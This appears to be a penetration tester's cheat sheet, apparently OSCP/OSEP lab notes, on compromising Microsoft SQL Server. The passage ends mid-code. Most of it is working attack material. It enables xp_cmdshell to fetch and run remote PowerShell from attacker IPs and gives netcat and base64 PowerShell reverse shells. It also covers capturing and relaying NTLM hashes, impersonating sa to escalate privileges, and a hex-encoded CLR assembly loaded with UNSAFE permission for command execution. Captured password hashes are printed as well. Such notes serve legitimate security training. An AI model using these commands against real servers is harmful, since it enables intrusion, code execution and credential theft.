# (1433) MSSQL

<details>

<summary>Connecting to MSSQL</summary>

### Mssqlclient

```sh
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.62.217 -windows-auth
```

* May not need `-windows-auth`

### Mssqlpwner

<pre class="language-powershell"><code class="lang-powershell">mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth interactive

# To obtain reverse shell from DB01
exec "powershell.exe -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
<strong>
</strong><strong># To find linked servers
</strong><strong>get-link-server-list 
</strong><strong>
</strong><strong># To obtain reverse shell from DB02 (linked server)
</strong>mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth -link-name DB02 exec "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
</code></pre>

```bash
sqsh -S <server’s ip> -U <username> -P <password>
```

</details>

<details>

<summary>CrackMapExec MSSQL Execute OS Commands</summary>

### CMD Commands:

```bash
proxychains -q crackmapexec mssql 10.10.105.148 -u sql_svc -p Dolphin1 -x "curl http://10.10.105.147:8000/reverse.exe --output c:\temp\reverse.exe"
```

### PS Commands:

```bash
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

</details>

<details>

<summary>Activating xp_cmdshell</summary>

<pre><code><strong>EXEC sp_configure 'show advanced options', 1;
</strong></code></pre>

```
RECONFIGURE;
```

```
sp_configure;
```

```
EXEC sp_configure 'xp_cmdshell', 1;
```

```
RECONFIGURE;
```

</details>

<details>

<summary>Obtaining reverse shell from MSSQL</summary>

* Download the nc64.exe from [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) or `cp /usr/share/windows-resources/binaries/nc.exe .`

```sh
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"
```

* Bind `cmd.exe` through nc and connect back to listener

```sh
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```

### OR

On attacker:

```
sudo python3 /usr/local/bin/smbserver.py share .
```

* May need `-smb2support`switch

On victim:

```bash
exec xp_cmdshell "copy \\10.10.14.68\share\reverse.exe ."
```

### OR&#x20;

* Able to reach attacker from MS01
* Unable to reach attacker from MS02 (where MSSQL exists)

#### Setup SSH Reverse Port Forward to remote server

On attacker:

```bash
ssh web_svc@192.168.218.147 -N -R *:7777:localhost:7777 
```

#### Create Powershell Reverse shell payload

* Reverse IP is the internal IP of MS01
* Reverse Port is 7777

On attacker:

```bash
wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
python3 mkpsrevshell.py 10.10.108.147 7777
# powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwADgALg
```

#### Use xp\_cmdshell to run powershell rev shell payload

```sql
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

SQL> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwADgALgAxADQANwAiACwANwA3ADcANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

#### Obtain Rev shell

```bash
┌──(root㉿kali)-[/prac_oscp/ad_set2]
└─# nc -lvp 7777
listening on [any] 7777 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 39614

PS C:\Windows\system32> whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> 

```

</details>

<details>

<summary>Capture MSSQL credentials with xp_dirtree</summary>

[https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)

* Setup the smbserver
  * Depends if `-smb2support` is needed

```bash
python3 /usr/local/bin/smbserver.py share . -smb2support
```

* Login to MSSQL server

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth
```

* Run the `xp_dirtree` command to connect to our smbserver

```sql
EXEC master.sys.xp_dirtree '\\\\10.10.14.6\\share',1, 1
```

* Obtained the hash for `mssql-svc` account

```bash
mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:533f791f193e74c54f52806542c622ee:010100000000000000aa4a71c657d90177d39b57c2e762eb0000000001001000500075004b0071004900470061006f0003001000500075004b0071004900470061006f000200100056004d004a00510070006900760073000400100056004d004a00510070006900760073000700080000aa4a71c657d901060004000200000008003000300000000000000000000000003000007f0fd403abd9b83ec1da57b18ed542302ab365d2b86e14497a32441ca7a2abe60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000
```

</details>

<details>

<summary>Manual MSSQL Commands</summary>

```sql
# Enumerate all Databases
SELECT name, database_id FROM sys.databases;
USE <targetDB>;

# Enumerate all tables in specified database:
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';

# Enumerate all columns in specified table:
SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = N'<schema>' AND TABLE_NAME = N'<tableName>' ORDER BY ORDINAL_POSITION;

# Dump all fields of specified table:
SELECT * FROM <schema>.<tableName>;

# Dump selective fields:
SELECT username,password FROM dbo.users;
```

Alternative commands:

```sql
impacket-mssqlclient administrator@dc1.scrm.local -k -no-pass

SELECT name FROM sys.databases;
SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
SELECT * FROM ScrambleHR.dbo.UserImport
```

Check if current user has sysadmin rights:

```
select IS_SRVROLEMEMBER ('sysadmin')
```

</details>

## OSEP CODE BELOW!

<details>

<summary>Adding Local Admin Account to MSSQL Server</summary>

Follow guide [here](https://hex64.net/blog/how-to-recover-sa-password-on-microsoft-sql-server/)

1. Go to Sql Server Configuration Manager

![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

2. Stop the SQL server

![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

3. Right click --> Properties

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

4. Add startup parameter "-m" --> apply --> ok

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

5. Restart the server

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

6. Open sqlcmd --> RUN AS ADMINISTRATOR

![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png>)

7. Create new Windows Authentication login for bill user on MSSQL server

```sql
EXEC sp_addsrvrolemember 'SQL11\bill', 'sysadmin'
go
```

8. Remove the -m options from the startup parameters

![](<../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png>)

9. Restart the MSSQL server
10. Go to Microsoft SQL Server Management Studio & use Windows Authentication login

![](<../.gitbook/assets/image (8) (1) (1) (1).png>)

</details>

<details>

<summary>Enumerate Registered SPNs for MSSQL</summary>

```powershell
# Enumeration for any registered SPNs for MSSQL in prod.corp1.com
setspn -T <domain> -Q MSSQLSvc/*
```

</details>

<details>

<summary>Enumeration within SQL Server Management Studio</summary>

* View the users present on MSSQL Server
  *

      <figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


* View the users required to access linked servers
  *   Server Objects --> \<Linked Server Name>

      <figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption><p>webapp11 acc required to access SQL27</p></figcaption></figure>


*   If ... is not configured for RPC for linked server, do the following or `EXEC sp_serveroption 'SQL03', 'rpc out', 'true';`

    * Server Objects --> Linked Servers --> Right-click on SQL03 and click on "Properties"
    *

        <figure><img src="../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>


    *   "Server Options" --> "RPC" and "RPC Out" to True --> click ok

        <figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>





</details>

<details>

<summary>Changing Password Using SQL Server Management Studio </summary>

* Logins --> \<Username to change pw> --> Properties
  *

      <figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>


* Change password to attacker's defined password "P@ssw0rd123!"
  *

      <figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Enumeration With Code</summary>

* Obtaining MSSQL Account Name
  * If a SQL Server login has **sysadmin** privileges, SQL Server automatically maps them to `dbo` in any database

```csharp
String querylogin = "SELECT SYSTEM_USER;";
SqlCommand command = new SqlCommand(querylogin, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Logged in as: " + reader[0]);
reader.Close();

String queryUser = "SELECT USER_NAME();";
command = new SqlCommand(queryUser, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Mapped to the user: " + reader[0]);
reader.Close();

String queryPublicRole = "SELECT IS_SRVROLEMEMBER('public');";
command = new SqlCommand(queryPublicRole, con);
reader = command.ExecuteReader();
reader.Read();
if (reader[0].ToString() == "1")
{
    Console.WriteLine("User is a member of public role");
}
else
{
    Console.WriteLine("User is NOT a member of public role");
}
reader.Close();

String querySysadminRole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
command = new SqlCommand(querySysadminRole, con);
reader = command.ExecuteReader();
reader.Read();
if (reader[0].ToString() == "1")
{
    Console.WriteLine("User is a member of sysadmin role");
}
else
{
    Console.WriteLine("User is NOT a member of sysadmin role");
}
reader.Close();

con.Close();
```

</details>

<details>

<summary>Template Code</summary>

```csharp
using System;
using System.Data.SqlClient;
using System.Runtime.Remoting.Messaging;
using System.Text;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            
            // Username and Password Login
            // string userid = "webapp11";
            // string password = "P@ssw0rd123!";
            // String conString = "Server = " + sqlServer + "; Database = " + database + "; user id= " + userid + "; password= " + password;
            
            // Windows Authentication Login
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //WRITE CODE HERE!

            //END OF CODE!

            con.Close();
        }
    }
}
```

</details>

<details>

<summary>Obtaining Net-NTLM (NTLMv2) hash</summary>

```csharp
String query = "EXEC master..xp_dirtree \"\\\\192.168.45.197\\\\test\";";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();
```

* On Responder to capture the Net-NTLM Hash

```bash
sudo responder -I tun0
```

* Crack hash using hashcat

```bash
hashcat.exe -m 5600 hash.txt rockyou.txt
```

</details>

<details>

<summary>Relaying Net-NTLM Hash</summary>

* Net-NTLM hash (NTLMv2) can't be used for pass-the-hash attack
* Can be used for relay attacks tho

- Generate [simple powershell rev shell b64 command](../exploitation/clm-bypass.md#unprivileged-bypass-using-installutil-bypass_clm_rev_shell.exe)
- Relay it to APPSRV01 (Always use FQDN instead of IP addr)
  * ```bash
    sudo impacket-ntlmrelayx --no-http-server -smb2support -t <Dest IP of the relay> -c 'powershell -enc cG93ZXJzaGVsbCAtYyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjQ1LjE5Ny9ydW5hbGwucHMxJyk='
    # sudo proxychains4 impacket-ntlmrelayx  --no-http-server -smb2support -t sql05.example.com:445 -c "powershell -e SQBFAFgAI.."
    ```

* Force SMB request from SQL server
  * ```csharp
    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Configuration.Install;
    using System.Runtime.InteropServices;
    using System.Data.SqlClient;

    namespace custom_installutil
    {
        
        internal class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine("This is the main method which is a decoy");
            }
        }

        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {

                String sqlServer = "sql07.example.com";
                String database = "master";
                String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

                SqlConnection con = new SqlConnection(conString);

                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                //WRITE CODE HERE!
                String query = "EXEC master..xp_dirtree \"\\\\192.168.45.170\\\\test\";";
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
                //END OF CODE!

                con.Close();
            }
        }
    }

    ```

</details>

<details>

<summary>Privilege Escalation</summary>

* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
  *   ```csharp
      String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
      SqlCommand command = new SqlCommand(query, con);
      SqlDataReader reader = command.ExecuteReader();

      while(reader.Read() == true)
      {
        Console.WriteLine("Logins that can be impersonated: " + reader[0]);
      }
      reader.Close();
      ```


* Impersonate "sa" using EXECUTE AS LOGIN&#x20;
  * Impersonates a server-level login.
  * ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
  *   ```csharp
      String querylogin = "SELECT SYSTEM_USER;";
      SqlCommand command = new SqlCommand(querylogin, con);
      SqlDataReader reader = command.ExecuteReader();
      reader.Read();
      Console.WriteLine("Before Impersonation: " + reader[0]);
      reader.Close();

      String executeas = "EXECUTE AS LOGIN = 'sa';";
      command = new SqlCommand(executeas, con);
      reader = command.ExecuteReader();
      reader.Close();

      querylogin = "SELECT SYSTEM_USER;";
      command = new SqlCommand(querylogin, con);
      reader = command.ExecuteReader();
      reader.Read();
      Console.WriteLine("After Impersonation: " + reader[0]);
      reader.Close();
      ```


* Impersonate using EXECUTE AS USER
  * Impersonates a database user within a single database. ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
  * ```csharp
    String querylogin = "SELECT USER_NAME();";
    SqlCommand command = new SqlCommand(querylogin, con);
    SqlDataReader reader = command.ExecuteReader();
    reader.Read();
    Console.WriteLine("Before Impersonation: " + reader[0]);
    reader.Close();

    String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
    command = new SqlCommand(executeas, con);
    reader = command.ExecuteReader();
    reader.Close();

    querylogin = "SELECT USER_NAME();";
    command = new SqlCommand(querylogin, con);
    reader = command.ExecuteReader();
    reader.Read();
    Console.WriteLine("After Impersonation: " + reader[0]);
    reader.Close();
    ```

</details>

<details>

<summary>Obtaining Code Execution</summary>

* xp\_cmdshell
  * disabled by default since Microsoft SQL 2005
  *   ```csharp
      String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
      String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
      String execCmd = "EXEC xp_cmdshell 'powershell -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://192.168.45.197/runall.ps1\\\")\"'";
      Console.WriteLine(execCmd);

      SqlCommand command = new SqlCommand(impersonateUser, con);
      SqlDataReader reader = command.ExecuteReader();
      reader.Close();

      command = new SqlCommand(enable_xpcmd, con);
      reader = command.ExecuteReader();
      reader.Close();

      command = new SqlCommand(execCmd, con);
      command.ExecuteReader();
      ```


* sp\_OACreate
  * Not possible to obtain the results from the executed command because of the local scope of the @myshell variable.
  * ```csharp
    String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
    String enable_ole = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
    String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -e SQBFAFgAI...';";

    SqlCommand command = new SqlCommand(impersonateUser, con);
    SqlDataReader reader = command.ExecuteReader();
    reader.Close();

    command = new SqlCommand(enable_ole, con);
    reader = command.ExecuteReader();
    reader.Close();

    command = new SqlCommand(execCmd, con);
    reader = command.ExecuteReader();
    ```

</details>

<details>

<summary>Impersonating sa account &#x26; add user to sysadmin group</summary>

```csharp
            //WRITE CODE HERE!
            // impersonate the 'sa' login
            string impersonateSql = "EXECUTE AS LOGIN = 'sa';";
            using (var impCmd = new SqlCommand(impersonateSql, con))
            {
                impCmd.ExecuteNonQuery();
            }

            // add 'zabbix' to the sysadmin fixed server role
            string grantSql = "ALTER SERVER ROLE [sysadmin] ADD MEMBER [zabbix];";
            using (var grantCmd = new SqlCommand(grantSql, con))
            {
                grantCmd.ExecuteNonQuery();
                Console.WriteLine("Added 'zabbix' to sysadmin role.");
            }
            //END OF CODE!
```

</details>

<details>

<summary>Custom Assembly Code</summary>

```csharp
String executeas = "EXECUTE AS LOGIN = 'sa';";
SqlCommand  command = new SqlCommand(executeas, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();


new SqlCommand("USE msdb;", con).ExecuteNonQuery();
new SqlCommand("DROP PROCEDURE IF EXISTS [dbo].[cmdExec];", con).ExecuteNonQuery();
new SqlCommand("DROP ASSEMBLY IF EXISTS myAssembly;", con).ExecuteNonQuery();
Console.WriteLine("Previous procedure and assemably dropped");

new SqlCommand("use msdb", con).ExecuteNonQuery();
new SqlCommand("EXEC sp_configure 'show advanced options',1; RECONFIGURE;", con).ExecuteNonQuery();
new SqlCommand("EXEC sp_configure 'clr enabled',1; RECONFIGURE;", con).ExecuteNonQuery();
new SqlCommand("EXEC sp_configure 'clr strict security',0; RECONFIGURE;", con).ExecuteNonQuery();

new SqlCommand("CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500006486020050C66EB30000000000000000F00022200B023000000C000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000A8030000000000000000000000000000000000000000000000000000042A0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000C70A000000200000000C000000020000000000000000000000000000200000602E72737263000000A80300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000F0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300000C04000023537472696E67730000000030070000580000002355530088070000100000002347554944000000980700005801000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E011B030600FB011B030600AC00E9020F003B0300000600D4007F02060071017F02060052017F020600E2017F020600AE017F020600C7017F02060001017F020600C000FC0206009E00FC02060035017F0206001C012D0206008D0378020A00EB00C8020A0047024A030E007003E9020A006200C8020E009F02E90206005D0278020A002000C8020A008E0014000A00DF03C8020A008600C8020600B0020A000600BD020A000000000001000000000001000100010010005F03000041000100010048200000000096003500620001000921000000008618E302060002000000010056000900E30201001100E30206001900E3020A002900E30210003100E30210003900E30210004100E30210004900E30210005100E30210005900E30210006100E30215006900E30210007100E30210007900E30210008900E30206009900E3020600990091022100A90070001000B10086032600A90078031000A90019021500A900C40315009900AB032C00B900E3023000A100E3023800C9007D003F00D100A00344009900B1034A00E1003D004F00810051024F00A1005A025300D100EA034400D100470006009900940306009900980006008100E302060020007B0051012E000B0068002E00130071002E001B0090002E00230099002E002B00AE002E003300AE002E003B00AE002E00430099002E004B00B4002E005300AE002E005B00AE002E006300CC002E006B00F6002E00730003011A00048000000100000000000000000000000000F903000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007802000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700637573746F6D5F617373656D626C792E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700637573746F6D5F617373656D626C7900000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F0075007400700075007400000044BEF8EDD3807643B9A0D52B9D2ED00B00042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001401000F637573746F6D5F617373656D626C79000005010000000017010012436F7079726967687420C2A920203230323500002901002431303532323137302D396236662D343934652D396663612D65363462333161616365353400000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E320401000000000000000000548FDEE600000000020000008B0000003C2A00003C0C000000000000000000000000000010000000000000000000000000000000525344530D06A345C7A497478837489D17592CF101000000433A5C55736572735C74657374696E675C4465736B746F705C4D79204578616D706C6520436F64655C4D5353514C5C637573746F6D5F617373656D626C795C637573746F6D5F617373656D626C795C6F626A5C7836345C52656C656173655C637573746F6D5F617373656D626C792E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C03000000000000000000004C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC020000010053007400720069006E006700460069006C00650049006E0066006F0000008802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000480010000100460069006C0065004400650073006300720069007000740069006F006E000000000063007500730074006F006D005F0061007300730065006D0062006C0079000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000048001400010049006E007400650072006E0061006C004E0061006D006500000063007500730074006F006D005F0061007300730065006D0062006C0079002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200350000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005000140001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063007500730074006F006D005F0061007300730065006D0062006C0079002E0064006C006C000000400010000100500072006F0064007500630074004E0061006D0065000000000063007500730074006F006D005F0061007300730065006D0062006C0079000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\r\n WITH PERMISSION_SET = UNSAFE;", con).ExecuteNonQuery();

new SqlCommand("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];", con).ExecuteNonQuery();

String execCmd = "EXEC cmdExec 'powershell -e SQBFAF...'";
command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Result of command is: " + reader[0]);
}
reader.Close();
```

</details>

<details>

<summary>Linked SQL Servers</summary>

* Query executed on one SQL server performs action on a different SQL server
* Does not require any privileges to find linked sql servers
* SQL server links are not bidirectional by default
* Possible to use a bidirectional link to elevate privileges on the same SQL server

- Finding linked servers on SQL server ![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
  * Eg: APPSRV01 linked to DC01
    *   ```csharp
        String execCmd = "EXEC sp_linkedservers;";

        SqlCommand command = new SqlCommand(execCmd, con);
        SqlDataReader reader = command.ExecuteReader();

        while (reader.Read())
        {
